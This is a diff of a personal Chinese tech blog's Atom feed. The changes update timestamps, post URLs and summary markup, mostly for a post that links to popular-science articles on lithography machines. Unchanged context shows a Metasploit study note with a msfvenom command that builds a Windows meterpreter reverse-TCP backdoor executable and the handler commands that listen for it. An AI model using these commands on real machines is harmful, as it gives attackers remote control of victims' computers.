@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://mocus.gitee.io/"/>
-  <updated>2019-12-22T02:10:11.076Z</updated>
+  <updated>2019-12-22T02:37:55.984Z</updated>
   <id>https://mocus.gitee.io/</id>
   
   <author>
@@ -21,18 +21,14 @@
     <link href="https://mocus.gitee.io/2019/guangkeji/"/>
     <id>https://mocus.gitee.io/2019/guangkeji/</id>
     <published>2019-12-21T14:16:02.000Z</published>
-    <updated>2019-12-22T02:10:11.076Z</updated>
+    <updated>2019-12-22T02:37:55.984Z</updated>
     
-    <content type="html"><![CDATA[<p>因为没去申请授权，所以只贴链接</p><p>（算是光刻机的科普资料）<br>&lt;!– more –&gt;</p><p><img src="https://s2.ax1x.com/2019/12/21/Qvjpb4.jpg" alt="Qvjpb4.jpg"></p><h2 id="链接地址"><a href="#链接地址" class="headerlink" title="链接地址"></a>链接地址</h2><p>微信公众号：<a href="https://mp.weixin.qq.com/s/t1U_GE7EU-Zm0fal8wM8aw" target="_blank" rel="noopener">金捷幡（ID：jin-jiefan）</a>，作者：金捷幡</p><p>链接：</p><p><a href="https://www.huxiu.com/article/307211.html" target="_blank" rel="noopener">https://www.huxiu.com/article/307211.html</a></p><p><a href="https://www.huxiu.com/article/298280.html" target="_blank" rel="noopener">https://www.huxiu.com/article/298280.html</a></p><p><a href="https://www.huxiu.com/article/305328.html" target="_blank" rel="noopener">https://www.huxiu.com/article/305328.html</a></p>]]></content>
+    <content type="html"><![CDATA[<p>因为没去申请授权，所以只贴链接</p><p>（算是光刻机的科普资料）</p><a id="more"></a><p><img src="https://s2.ax1x.com/2019/12/21/Qvjpb4.jpg" alt="Qvjpb4.jpg"></p><h2 id="链接地址"><a href="#链接地址" class="headerlink" title="链接地址"></a>链接地址</h2><p>微信公众号：<a href="https://mp.weixin.qq.com/s/t1U_GE7EU-Zm0fal8wM8aw" target="_blank" rel="noopener">金捷幡（ID：jin-jiefan）</a>，作者：金捷幡</p><p>链接：</p><p><a href="https://www.huxiu.com/article/307211.html" target="_blank" rel="noopener">https://www.huxiu.com/article/307211.html</a></p><p><a href="https://www.huxiu.com/article/298280.html" target="_blank" rel="noopener">https://www.huxiu.com/article/298280.html</a></p><p><a href="https://www.huxiu.com/article/305328.html" target="_blank" rel="noopener">https://www.huxiu.com/article/305328.html</a></p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;因为没去申请授权，所以只贴链接&lt;/p&gt;
-&lt;p&gt;（算是光刻机的科普资料）&lt;br&gt;&amp;lt;!– more –&amp;gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/21/Qvjpb4.jpg&quot; alt=&quot;Qvjpb4.jpg&quot;&gt;&lt;/p
-      
+      &lt;p&gt;因为没去申请授权，所以只贴链接&lt;/p&gt;
+&lt;p&gt;（算是光刻机的科普资料）&lt;/p&gt;
     
     </summary>
     
@@ -47,7 +43,7 @@
     <link href="https://mocus.gitee.io/2019/msfdailystudy/"/>
     <id>https://mocus.gitee.io/2019/msfdailystudy/</id>
     <published>2019-12-20T23:14:51.000Z</published>
-    <updated>2019-12-21T15:02:32.210Z</updated>
+    <updated>2019-12-22T02:34:19.621Z</updated>
     
     <content type="html"><![CDATA[<p>一些乱七八糟的东西</p><a id="more"></a><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>使用msfvenom</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.105.100.1  LPORT&#x3D;4444 -f exe &gt; winc.exe</span></pre></td></tr></table></figure><p>开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">run</span></pre></td></tr></table></figure>]]></content>
     
@@ -108,8 +104,8 @@
   
   <entry>
     <title>配置信息</title>
-    <link href="https://mocus.gitee.io/2019/ck4ge5f0r0009g9s680ga3zbp/"/>
-    <id>https://mocus.gitee.io/2019/ck4ge5f0r0009g9s680ga3zbp/</id>
+    <link href="https://mocus.gitee.io/2019/ck4gejksl00089vs669kibb9a/"/>
+    <id>https://mocus.gitee.io/2019/ck4gejksl00089vs669kibb9a/</id>
     <published>2019-11-29T07:02:08.000Z</published>
     <updated>2019-12-21T15:02:32.210Z</updated>
     
@@ -133,8 +129,8 @@
   
   <entry>
     <title>我的第一篇文章</title>
-    <link href="https://mocus.gitee.io/2019/ck4ge5ezl0006g9s64y5ydyf2/"/>
-    <id>https://mocus.gitee.io/2019/ck4ge5ezl0006g9s64y5ydyf2/</id>
+    <link href="https://mocus.gitee.io/2019/ck4gejks000059vs60dbrfzse/"/>
+    <id>https://mocus.gitee.io/2019/ck4gejks000059vs60dbrfzse/</id>
     <published>2019-11-29T05:08:38.000Z</published>
     <updated>2019-12-21T15:02:32.210Z</updated>
     
